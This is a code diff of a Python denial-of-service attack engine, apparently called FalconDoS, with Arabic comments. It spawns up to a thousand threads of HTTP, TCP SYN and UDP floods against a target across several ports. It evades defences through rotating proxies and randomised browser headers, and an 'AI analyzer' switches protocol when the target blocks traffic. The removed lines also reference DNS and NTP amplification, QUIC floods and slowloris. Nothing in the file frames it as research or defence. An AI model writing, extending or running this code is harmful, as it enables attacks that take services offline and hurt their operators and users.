@@ -1,127 +1,115 @@
 import threading
-import random
 import time
-from protocols import tcp_syn, udp_flood, http_flood, dns_amp, ntp_amp, quic_flood, slowloris
-from stealth import header_mutator, proxy_rotator
-from core import ai_analyzer
+import random
+from core import proxy_rotator  # يجب أن توفر وحدة proxy_rotator قوية تدير البروكسيات
+from protocols import http_flood, tcp_syn, udp_flood
+from core.ai_analyzer import AIAttackAnalyzer
+
 
 class AttackEngine:
-    """
-    المحرك الرئيسي لهجمات FalconDoS:
-    يدير الهجوم على عدة منافذ وبروتوكولات في نفس الوقت،
-    ويستخدم الذكاء الاصطناعي لتعديل استراتيجية الهجوم ديناميكيًا.
-    """
-
-    def __init__(self, target_ip, ports, protocols, threads_per_port=1000, duration=60):
-        """
-        تهيئة المحرك:
-        - target_ip: عنوان الهدف
-        - ports: قائمة المنافذ المستهدفة (يمكن رقم واحد أو قائمة)
-        - protocols: البروتوكولات المستخدمة في الهجوم (مثل ["TCP", "HTTP"])
-        - threads_per_port: عدد الخيوط (threads) لكل بروتوكول على كل منفذ
-        - duration: مدة الهجوم بالثواني
-        """
+    def __init__(self, target_ip, ports, threads=1000):
         self.target_ip = target_ip
-        self.ports = ports if isinstance(ports, list) else [ports]  # نتأكد أنها قائمة
-        self.protocols = protocols
-        self.threads_per_port = threads_per_port
-        self.duration = duration
-
-        self.threads = []  # لتخزين جميع الخيوط النشطة
-        self.running = True  # حالة الهجوم (مستمرة أو متوقفة)
-
-        # تتبع حالة كل بروتوكول (مفعل أو لا)
+        self.ports = ports
+        self.threads_count = threads
+        self.protocols = ["HTTP", "TCP", "UDP"]
         self.protocol_status = {p: True for p in self.protocols}
+        self.current_protocol = "HTTP"
+        self.running = False
+        self.active_threads = []
+        self.lock = threading.Lock()
+
+        # بدء محلل الذكاء الاصطناعي مع دالة رد نداء لتغيير البروتوكول
+        self.ai_analyzer = AIAttackAnalyzer(
+            target_ip=self.target_ip,
+            control_callback=self.protocol_change_handler,
+            protocols=self.protocols,
+            max_blocked_before_switch=3,
+            http_port=80,
+            tcp_port=80,
+            udp_port=80,
+            timeout=5,
+            check_interval=5
+        )
+
+    def protocol_change_handler(self, new_protocol):
+        with self.lock:
+            print(f"[AI] تغيير البروتوكول النشط من {self.current_protocol} إلى {new_protocol}")
+            self.current_protocol = new_protocol
+            # تعيين حالة البروتوكولات بحيث يبقى فقط الجديد مفعل
+            for p in self.protocol_status:
+                self.protocol_status[p] = (p == new_protocol)
 
     def start(self):
-        """
-        تبدأ الهجوم:
-        - تنشئ الخيوط لكل بروتوكول ولكل منفذ
-        - تبدأ مراقب الذكاء الاصطناعي لتعديل الهجوم
-        - تستمر مدة محددة ثم توقف كل الخيوط
-        """
-        print(f"[INFO] بدء الهجوم على {self.target_ip} المنافذ: {self.ports} البروتوكولات: {self.protocols}")
+        self.running = True
+        print(f"[AttackEngine] بدء الهجوم على {self.target_ip} باستخدام {self.threads_count} خيوط عبر منافذ {self.ports}")
 
-        # تشغيل الخيوط لكل منفذ وبروتوكول مفعل
+        # بدء محلل الذكاء الاصطناعي في Thread منفصل
+        self.ai_analyzer.start()
+
+        # بدء خيوط الهجوم
         for port in self.ports:
-            for protocol in self.protocols:
-                if self.protocol_status.get(protocol, True):
-                    for _ in range(self.threads_per_port):
-                        t = threading.Thread(target=self.attack_runner, args=(protocol, port))
-                        t.daemon = True  # تضمن إغلاق الخيوط مع إغلاق البرنامج
-                        t.start()
-                        self.threads.append(t)
+            for _ in range(self.threads_count // len(self.ports)):
+                t = threading.Thread(target=self.attack_thread, args=(port,))
+                t.daemon = True
+                t.start()
+                self.active_threads.append(t)
 
-        # بدء مراقب الذكاء الاصطناعي في Thread مستقل
-        ai_thread = threading.Thread(target=self.ai_monitor)
-        ai_thread.daemon = True
-        ai_thread.start()
+    def stop(self):
+        print("[AttackEngine] إيقاف الهجوم...")
+        self.running = False
+        self.ai_analyzer.stop()
+        self.ai_analyzer.join()
+        for t in self.active_threads:
+            if t.is_alive():
+                t.join(timeout=1)
+        print("[AttackEngine] تم الإيقاف الكامل.")
 
-        # الاستمرار في الهجوم للمدة المحددة
-        time.sleep(self.duration)
-        self.running = False  # إشارة لإيقاف الهجوم
-
-        # انتظار انتهاء الخيوط مع مهلة قصيرة لكل منها
-        for t in self.threads:
-            t.join(timeout=1)
-
-        print("[INFO] انتهى الهجوم.")
-
-    def attack_runner(self, protocol, port):
-        """
-        الدالة التي تنفذ الهجوم:
-        - تعمل في حلقة مستمرة طالما الهجوم شغال والبروتوكول مفعل
-        - تولد بيانات التخفّي (رؤوس HTTP، IP مصدر عشوائي، حجم حزمة عشوائي)
-        - تستدعي دالة الهجوم الخاصة بالبروتوكول
-        - تضيف تأخير صغير لتوزيع الحمل
-        """
-        while self.running and self.protocol_status.get(protocol, True):
-            # توليد رؤوس HTTP عشوائية فقط للبروتوكولات التي تحتاجها
-            headers = header_mutator.random_headers() if protocol in ["HTTP", "QUIC", "SLOWLORIS"] else {}
-
-            # اختيار IP مصدر عشوائي عبر بروكسي أو تور
-            ip_source = proxy_rotator.get_random_proxy()
-
-            # اختيار حجم الحزمة عشوائي من 512 إلى 4096 بايت (للتنوع وتجاوز الحماية)
-            packet_size = random.randint(512, 4096)
-
-            try:
-                # استدعاء دالة الهجوم الخاصة بالبروتوكول
-                if protocol == "TCP":
-                    tcp_syn.attack(self.target_ip, port, packet_size, ip_source)
-                elif protocol == "UDP":
-                    udp_flood.attack(self.target_ip, port, packet_size, ip_source)
-                elif protocol == "HTTP":
-                    http_flood.attack(self.target_ip, port, headers, ip_source)
-                elif protocol == "DNS_AMP":
-                    dns_amp.attack(self.target_ip, port, packet_size, ip_source)
-                elif protocol == "NTP_AMP":
-                    ntp_amp.attack(self.target_ip, port, packet_size, ip_source)
-                elif protocol == "QUIC":
-                    quic_flood.attack(self.target_ip, port, headers, ip_source)
-                elif protocol == "SLOWLORIS":
-                    slowloris.attack(self.target_ip, port, headers, ip_source)
-            except Exception as e:
-                print(f"[ERROR] خطأ في الهجوم باستخدام {protocol} على المنفذ {port}: {e}")
-
-            # تأخير صغير لتوزيع الحزم بشكل متوازن وعدم إرسالها دفعة واحدة
-            time.sleep(0.001)
-
-    def ai_monitor(self):
-        """
-        مراقب الذكاء الاصطناعي:
-        - يستدعي وحدة التحليل AI لتحليل ردود الهدف كل 5 ثواني
-        - إذا اكتشف حجب أو تحدي، يمكنه تعديل استراتيجية الهجوم
-        - (مثلاً تعطيل بروتوكول معين أو تقليل عدد الخيوط)
-        """
+    def attack_thread(self, port):
         while self.running:
-            change_needed = ai_analyzer.analyze(self.target_ip)
-            if change_needed:
-                print("[AI] تعديل استراتيجية الهجوم بناءً على ردود الهدف.")
-                # هنا يمكن إضافة منطق ذكي لإدارة البروتوكولات
-                # مثال (غير مفعّل):
-                # for protocol in self.protocols:
-                #     self.protocol_status[protocol] = False
-                #     print(f"[AI] تم تعطيل البروتوكول: {protocol}")
+            with self.lock:
+                protocol = self.current_protocol
+                enabled = self.protocol_status.get(protocol, False)
 
-            time.sleep(5)  # الانتظار 5 ثواني قبل التحقق مجددًا
+            if not enabled:
+                time.sleep(0.1)
+                continue
+
+            proxy = proxy_rotator.get_random_proxy()  # توقع أن تعيد str: "ip:port" أو None
+            try:
+                if protocol == "HTTP":
+                    headers = self.random_headers()
+                    http_flood.attack(self.target_ip, port, headers=headers, proxy=proxy)
+                elif protocol == "TCP":
+                    tcp_syn.attack(self.target_ip, port, packet_size=1024, ip_source=proxy)
+                elif protocol == "UDP":
+                    udp_flood.attack(self.target_ip, port, packet_size=512, ip_source=proxy)
+                else:
+                    time.sleep(0.05)
+            except Exception as e:
+                print(f"[AttackEngine] خطأ في هجوم {protocol} على {port}: {e}")
+
+            time.sleep(0.001)  # تفادي التحميل الزائد على النظام
+
+    @staticmethod
+    def random_headers():
+        user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
+            "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/112.0.0.0"
+        ]
+        return {
+            "User-Agent": random.choice(user_agents),
+            "Referer": "https://google.com/search?q=" + str(random.randint(1000, 9999)),
+            "Cookie": "session=" + str(random.randint(100000, 999999))
+        }
+
+
+if __name__ == "__main__":
+    engine = AttackEngine(target_ip="1.2.3.4", ports=[80, 443, 8080], threads=1000)
+    try:
+        engine.start()
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        engine.stop()
